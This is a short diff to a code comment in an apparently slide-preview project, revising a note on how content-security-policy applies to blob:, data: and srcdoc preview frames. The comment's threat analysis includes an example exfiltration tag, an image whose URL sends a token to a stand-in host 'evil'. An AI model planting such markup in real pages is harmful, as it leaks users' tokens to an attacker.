@@ -24,7 +24,7 @@
      Moving the preview to a document of its own (go-slides#90) was measured
      in Chrome and does NOT close this: a blob: and a data: frame inherit the
      page's policy like srcdoc; only a frame loaded from a URL gets a policy of
-     its own (CSP3 "initialize a global object's CSP list"), and the page then
+     its own (measured, not derived from the CSP3 text), and the page then
      hands that frame the deck as a message. A script injected into the page
      can hand it markup too, <img src="https://evil/?t=TOKEN"> included, so the
      route is moved, not closed: showing remote images from a deck IS sending
